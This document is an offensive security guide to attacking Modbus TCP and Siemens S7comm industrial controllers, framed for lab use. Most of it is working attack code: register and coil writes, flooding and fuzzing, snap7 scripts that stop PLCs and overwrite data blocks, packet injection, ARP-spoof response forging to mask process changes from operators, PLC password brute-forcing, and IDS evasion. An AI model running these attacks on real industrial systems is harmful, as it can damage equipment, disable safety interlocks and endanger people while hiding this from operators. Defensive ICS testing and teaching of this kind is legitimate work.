# Modbus and S7comm Attack Guide

## Overview

Modbus TCP and Siemens S7comm are two of the most widely deployed ICS protocols, and both share a critical security limitation: they were designed in an era when network security was not a consideration. Modbus has zero authentication or encryption. S7comm, while offering optional password protection on newer firmware, is often deployed without it. This guide covers attack techniques against both protocols in lab environments.

**WARNING:** These techniques must only be used in isolated lab environments with non-production equipment. Unauthorized manipulation of industrial control systems can cause physical damage, environmental releases, injury, or death.

## Part 1: Modbus TCP Attacks

### Understanding the Modbus Attack Surface

Modbus TCP operates on a simple request-response model. The master sends a function code request, and the slave responds. There is no session establishment, no handshake, no authentication, and no encryption. Any host that can reach port 502 on a Modbus device becomes an unauthorized master.

Key function codes for attack:

| Function Code | Name | Risk |
|---------------|------|------|
| 01 | Read Coils | Information disclosure |
| 02 | Read Discrete Inputs | Information disclosure |
| 03 | Read Holding Registers | Information disclosure |
| 04 | Read Input Registers | Information disclosure |
| 05 | Write Single Coil | Process manipulation |
| 06 | Write Single Register | Process manipulation |
| 15 | Write Multiple Coils | Process manipulation |
| 16 | Write Multiple Registers | Process manipulation |
| 43 | Read Device Identification | Device fingerprinting |

### Register Mapping and Process Understanding

Before any write attack, you must understand what the registers control. In a lab environment:

```bash
# Read the full register space to map process variables
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 125 -t holding
modbus-cli read -a 192.168.1.10 -s 1 -r 125 -n 125 -t holding
modbus-cli read -a 192.168.1.10 -s 1 -r 250 -n 125 -t holding

# Read coil states to understand digital I/O mapping
modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 100 -t coil
```

Registers typically map to physical process variables: temperature setpoints, valve positions, pump states, alarm thresholds, and flow rates. Documenting this mapping is essential for understanding the potential impact of any write operation.

### Register Manipulation Attacks

```bash
# Write a new value to a holding register (setpoint manipulation)
modbus-cli write -a 192.168.1.10 -s 1 -r 10 -v 500 -t holding

# Write multiple consecutive registers (multi-variable attack)
modbus-cli write -a 192.168.1.10 -s 1 -r 10 -v 500,750,1000 -t holding

# Force a coil ON (activate a digital output)
modbus-cli write -a 192.168.1.10 -s 1 -r 5 -v 1 -t coil

# Force a coil OFF (deactivate a digital output)
modbus-cli write -a 192.168.1.10 -s 1 -r 5 -v 0 -t coil

# Use mbpoll for rapid register modification
mbpoll -t 192.168.1.10 -p 502 -m tcp -r 10 -1 -v 999
```

### Modbus Denial of Service

A simpler but effective attack is to overwhelm a Modbus slave with rapid requests, potentially causing a watchdog timeout that forces the PLC into a fault state:

```bash
# Rapid-fire register reads to stress the device
for i in $(seq 1 1000); do
  modbus-cli read -a 192.168.1.10 -s 1 -r 0 -n 125 -t holding &
done
```

### Modbus Protocol Fuzzing with csric

`csric` provides structured fuzzing for Modbus and other ICS protocols. It generates malformed packets to test the robustness of protocol parsers:

```bash
# Fuzz Modbus TCP with default settings
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz

# Target specific function codes
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --function 0x03

# Limit iterations for controlled testing
csric -t 192.168.1.10 -p 502 -P modbus -f fuzz --iterations 500 --output fuzz_results/

# Capture all fuzzing traffic for crash analysis
tcpdump -i eth0 -w modbus_fuzz.pcap port 502 &
```

Fuzzing can reveal buffer overflows, integer overflows, and parsing errors in PLC firmware that may lead to remote code execution or denial of service.

## Part 2: Siemens S7comm Attacks

### S7comm Protocol Structure

S7comm operates over TCP port 102 using Siemens's TPKT and COTP transport layers. Communication follows a three-phase model:

1. **COTP Connection Request/Confirm** — Transport layer connection
2. **S7 Communication Setup** — S7 session parameters negotiation
3. **S7 Data Exchange** — Read/write operations, job requests

### Protection Level Assessment

Siemens PLCs support three protection levels controlled by the protection level register:

| Level | Access | Risk |
|-------|--------|------|
| No protection | Full read/write access to all areas | Critical |
| Write protection | Read access to all areas, no writes | High |
| Read/Write protection | No access without password | Medium |

Use s7scan to determine the protection level:

```bash
s7scan -t 192.168.1.20
```

### S7comm Memory Access Attacks

When a PLC has no protection (or the password is known/default), an attacker can access the full PLC memory space:

```bash
# Read from data block DB1, offset 0, length 64 bytes
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
data = c.db_read(1, 0, 64)
print('DB1 raw data:', data.hex())
c.disconnect()
"

# Read from a different memory area (I/O, markers, timers)
python3 -c "
from snap7.client import Client
from snap7.types import Areas
c = Client()
c.connect('192.168.1.20', 0, 1)
# Read marker memory (M area)
markers = c.read_area(Areas.MK, 0, 0, 32)
print('Marker area:', markers.hex())
c.disconnect()
"

# Write to a data block (lab only)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
data = bytearray(64)
data[0:4] = b'\\xde\\xad\\xbe\\xef'
c.db_write(1, 0, data)
print('Wrote to DB1')
c.disconnect()
"
```

### PLC State Manipulation

Changing the PLC operating mode is one of the most impactful attacks. Switching from RUN to STOP halts all process logic:

```bash
# Read current CPU state
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
state = c.get_cpu_state()
print(f'CPU State: {state}')
c.disconnect()
"

# Stop the PLC (lab only — this halts the process)
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
c.set_cpu_state('STOP')
print('PLC stopped')
c.disconnect()
"
```

### Block List Enumeration

Listing all blocks in the PLC reveals the program structure, data blocks, and function blocks:

```bash
python3 -c "
from snap7.client import Client
c = Client()
c.connect('192.168.1.20', 0, 1)
blocks = c.list_blocks()
print(f'Total blocks: {len(blocks)}')
for b in blocks:
    print(f'  Type: {b.blktype}, Number: {b.blknumber}')
c.disconnect()
"
```

### S7comm Fuzzing

```bash
# Fuzz the S7comm protocol
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz

# Capture fuzzing traffic
tcpdump -i eth0 -w s7_fuzz.pcap port 102 &
csric -t 192.168.1.20 -p 102 -P s7comm -f fuzz --iterations 1000
```

## Part 3: Advanced Modbus Attack Techniques

### Modbus TCP Session Hijacking

Modbus TCP has no session tokens or sequence numbers. The Transaction ID field is a simple incrementing counter chosen by the master with no validation by the slave. This enables session hijacking attacks where an attacker injects commands into an existing Modbus communication stream.

```bash
# Capture Modbus traffic and identify Transaction ID patterns
tshark -i eth0 -f "port 502" -Y "modbus" -T fields \
  -e ip.src -e ip.dst -e modbus.transid -e modbus.funccode | head -20

# Inject a Modbus write command with a predicted Transaction ID
# Requires ARP spoofing to intercept the traffic stream
python3 -c "
import socket
import struct
import time

target_ip = '192.168.1.10'
target_port = 502

# Predict next Transaction ID from observed traffic
# Typical pattern: sequential increment (0, 1, 2, ...)
next_tid = 42  # Predict based on observation

# Craft Modbus Write Single Register (FC 06)
# MBAP Header: TID=42, PID=0, Length=6, UnitID=1
# PDU: FC=06, Register Address=10, Register Value=999
mbap_header = struct.pack('>HHHB', next_tid, 0, 6, 1)
pdu = struct.pack('>BHH', 6, 10, 999)  # FC 06, addr 10, value 999
packet = mbap_header + pdu

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
s.connect((target_ip, target_port))
s.send(packet)
response = s.recv(1024)
print(f'Hijack response: {response.hex()}')
s.close()
"
```

### Modbus Response Spoofing

Since Modbus has no authentication, an attacker can forge responses from PLCs to the legitimate master (HMI/SCADA), feeding it false process data. This is a stealthy attack that can mask process manipulations from operators.

```bash
# ARP spoof to position between HMI and PLC
arpspoof -i eth0 -t 192.168.1.5 192.168.1.10  # HMI <-> PLC
arpspoof -i eth0 -t 192.168.1.10 192.168.1.5

# Forward legitimate traffic but modify specific register values
python3 -c "
from scapy.all import *
import struct

def modify_modbus_response(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        raw = bytes(packet[Raw].load)
        # Check if this is a Modbus response (length >= 9)
        if len(raw) >= 9 and raw[7] == 0x03:  # FC 03 response
            # Modify register value at specific offset
            # Original response has register data starting at byte 9
            modified = bytearray(raw)
            # Inject false temperature reading (e.g., 72.5F instead of actual)
            struct.pack_into('>H', modified, 9, 725)  # Fixed-point representation
            packet[Raw].load = bytes(modified)
    return packet

# This is a conceptual example - actual implementation requires
# careful TCP sequence number and checksum management
print('Modbus response spoofing framework ready')
"
```

### Modbus Traffic Analysis for Process Understanding

```bash
# Continuously capture and decode Modbus traffic to understand process behavior
python3 -c "
import subprocess
import time

# Capture Modbus traffic for analysis
proc = subprocess.Popen(
    ['tshark', '-i', 'eth0', '-f', 'port 502', '-Y', 'modbus',
     '-T', 'fields', '-e', 'frame.time_relative', '-e', 'ip.src',
     '-e', 'ip.dst', '-e', 'modbus.funccode', '-e', 'modbus.regval16'],
    stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
)

register_history = {}
start_time = time.time()

for line in proc.stdout:
    fields = line.strip().split('\t')
    if len(fields) >= 5:
        rel_time, src, dst, fc, val = fields[0], fields[1], fields[2], fields[3], fields[4]
        fc_int = int(fc) if fc else 0
        if fc_int == 3:  # Read Holding Registers response
            key = f'{src}->{dst}'
            if key not in register_history:
                register_history[key] = []
            register_history[key].append((float(rel_time), val))
            # Detect rapid changes (potential process anomaly indicator)
            if len(register_history[key]) > 2:
                print(f'[{rel_time}s] {key} FC={fc} val={val}')
"
```

## Part 4: Advanced S7comm Attack Techniques

### S7comm Block Upload and Program Extraction

Extracting the complete PLC program reveals the process control logic, safety interlocks, and communication configuration. This intelligence enables targeted attacks on specific process functions.

```bash
# Full PLC program extraction using snap7
python3 -c "
from snap7.client import Client
from snap7.types import BlockTypes
import hashlib

c = Client()
c.connect('192.168.1.20', 0, 1)

# List all blocks with their types and sizes
blocks = c.list_blocks()
print(f'Total blocks discovered: {len(blocks)}')
print()
print(f'{\"Type\":<8} {\"Number\":<10} {\"Size (bytes)\":<15} {\"MD5\"}')
print('-' * 50)

for block in blocks:
    try:
        # Get block info including size
        block_info = c.get_block_info(block.blktype, block.blknumber)
        print(f'{block.blktype:<8} {block.blknumber:<10} {block_info.size:<15}', end='')

        # Upload (extract) block data and compute hash
        block_data = c.upload(block.blktype, block.blknumber)
        md5 = hashlib.md5(block_data).hexdigest()[:12]
        print(f'{md5}')
    except Exception as e:
        print(f'ERROR: {e}')

c.disconnect()
print()
print('Block extraction complete. Analyze block data for:')
print('  - Process control logic (OB, FB, FC blocks)')
print('  - Data structures and setpoints (DB blocks)')
print('  - Communication configuration (connection resources)')
"
```

### S7comm PLC Program Modification

In an authorized lab environment, modifying the PLC program demonstrates the full impact of unauthorized access. Program modifications can change process behavior while the PLC continues running.

```bash
# Download a modified block to the PLC (lab only)
python3 -c "
from snap7.client import Client

c = Client()
c.connect('192.168.1.20', 0, 1)

# Read existing block data
original_db = c.db_read(1, 0, 100)
print(f'Original DB1 first 20 bytes: {original_db[:20].hex()}')

# Modify specific bytes in the data block
# In a real scenario, this could change a temperature setpoint,
# modify an alarm threshold, or disable a safety interlock
modified_db = bytearray(original_db)
modified_db[10:14] = b'\\x00\\x64\\x00\\x00'  # Change value at offset 10

# Write modified data back
c.db_write(1, 0, bytes(modified_db))
print('DB1 modified successfully')

# Verify the modification
verify_db = c.db_read(1, 0, 100)
print(f'Modified DB1 first 20 bytes: {verify_db[:20].hex()}')
print(f'Verification: {\"MATCH\" if verify_db == bytes(modified_db) else \"MISMATCH\"}')

c.disconnect()
"
```

### S7comm Password Brute Force

Siemens S7 PLCs support three protection levels, with Level 3 (full protection) requiring a password. The password is transmitted in plaintext within the S7comm session, making it vulnerable to interception and brute-force attacks.

```bash
# Capture S7comm password in transit (plaintext in session setup)
tshark -i eth0 -f "port 102" -Y "s7comm.param.func == 0x0c" -T fields \
  -e ip.src -e ip.dst -e s7comm.param

# Brute-force S7comm password using snap7
python3 -c "
from snap7.client import Client
import time

target = '192.168.1.20'
common_passwords = [
    '', '00000000', 'SYSTEM', 'S7', 'ADMIN', 'PASS',
    'PASSWORD', 'SIEMENS', '12345678', 'PLC', 'S7-1200',
    'DEFAULT', 'MASTER', 'CONTROL', 'OPC', 'HMI'
]

c = Client()
c.connect(target, 0, 1)

# Check current protection level
szl = c.read_szl(0x0232)
print(f'Protection level: {szl.items[0].Data[0] if szl.items else \"Unknown\"}')

for pwd in common_passwords:
    try:
        c.set_session_password(pwd.encode() if pwd else b'')
        # If we get here, the password was accepted
        print(f'SUCCESS: Password accepted: \"{pwd}\"')
        c.disconnect()
        break
    except Exception as e:
        err_str = str(e)
        if 'already' in err_str.lower():
            print(f'Password set with: \"{pwd}\"')
            break
        # Wrong password - continue
    time.sleep(0.5)  # Avoid rate limiting

c.disconnect()
"
```

### S7comm Communication Sniffing

```bash
# Capture and decode S7comm communication to extract process data
tshark -i eth0 -f "port 102" -Y "s7comm" -T fields \
  -e frame.time -e ip.src -e ip.dst \
  -e s7comm.param.func -e s7comm.param.reqfunc \
  -e s7comm.data.returncode -e s7comm.data.transportsize \
  -e s7comm.data.length

# Monitor PLC state changes in real-time
tshark -i eth0 -f "port 102" -Y "s7comm.param.func == 0x08" -T fields \
  -e frame.time -e ip.src -e ip.dst -e s7comm.param

# Extract all data block reads to map process variables
tshark -i eth0 -f "port 102" -Y "s7comm.param.func == 0x04 && s7comm.param.itemtype == 0x12" \
  -T fields -e frame.time -e ip.src -e s7comm.param.db -e s7comm.data
```

## Part 5: Protocol-Aware Attack Detection and Evasion

### Detecting ICS Security Monitoring

Before executing attacks in an authorized engagement, it is important to understand what detection capabilities are in place. ICS-specific security monitoring (such as Nozomi Networks, Claroty, Dragos, or open-source alternatives) can detect anomalous protocol behavior.

```bash
# Check for ICS-specific IDS/IPS devices
nmap -sT -p 443,8443,8080,9090 192.168.1.0/24 --script http-title

# Detect Snort/Suricata with ICS rulesets
# Look for common ICS IDS signatures in network behavior
# Send a known-benign Modbus packet and observe if a reset occurs
python3 -c "
import socket, struct

# Send Modbus Read Holding Registers (FC 03) from register 0
mbap = struct.pack('>HHHB', 0, 0, 6, 1)
pdu = struct.pack('>BHH', 3, 0, 10)
packet = mbap + pdu

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect(('192.168.1.10', 502))
s.send(packet)
resp = s.recv(1024)
print(f'Response: {resp.hex()}')
# If connection is reset or no response, IDS may be blocking
s.close()
"
```

### Timing-Based Evasion

ICS security monitoring often relies on behavioral baselines. Mimicking normal traffic patterns reduces the likelihood of detection:

```bash
# Study normal Modbus polling patterns
tshark -r baseline.pcap -Y "tcp.port==502 && modbus" -T fields \
  -e frame.time_delta -e ip.src -e ip.dst | head -50

# Calculate average polling interval
tshark -r baseline.pcap -Y "tcp.port==502 && modbus.funccode==3" -T fields \
  -e frame.time_delta | python3 -c "
import sys
deltas = [float(line.strip()) for line in sys.stdin if line.strip()]
if deltas:
    print(f'Avg polling interval: {sum(deltas)/len(deltas):.3f}s')
    print(f'Min: {min(deltas):.3f}s, Max: {max(deltas):.3f}s')
    print(f'Stdev: {(sum((x - sum(deltas)/len(deltas))**2 for x in deltas)/len(deltas))**0.5:.3f}s')
"
```

## Part 6: Safety Implications and Responsible Testing

ICS attacks differ fundamentally from IT attacks because they affect the physical world. Key safety principles for any ICS security testing:

1. **Never test against production systems.** Use a dedicated lab environment with identical (or similar) equipment.
2. **Understand the process.** Before any write operation, understand what physical process the register controls. A single register write could open a valve, start a pump, or change a temperature setpoint.
3. **Watchdog timers.** Many PLCs have hardware watchdogs that trigger a safe state if the PLC crashes. Fuzzing may activate these watchdogs and change the process state.
4. **No rollback guarantee.** Unlike IT systems, ICS processes may not recover gracefully from interruption. A stopped PLC may require manual intervention to restart safely.
5. **Document all changes.** Maintain a detailed log of every operation performed, including register addresses, values read and written, and any observed changes in the process.
6. **Communicate with operators.** In a real engagement, ensure control room operators are aware of testing activities and can halt testing if they observe process anomalies.

## References

- Modbus Application Protocol Specification V1.1b3 — https://modbus.org/docs/Modbus_Application_Protocol_V1_1b3.pdf
- Siemens S7comm Protocol Analysis — https://wiki.wireshark.org/S7comm
- snap7 library documentation — http://snap7.sourceforge.net/
- NIST SP 800-82 Rev. 3: Guide to Operational Technology (OT) Security — https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final
- MITRE ATT&CK for ICS: Inhibit Response Function — https://attack.mitre.org/techniques/ics/T0857/
- ICS-CERT Advisory Archive — https://www.cisa.gov/news-events/cybersecurity-advisories
- csric ICS fuzzer documentation — https://github.com/drainware/csric
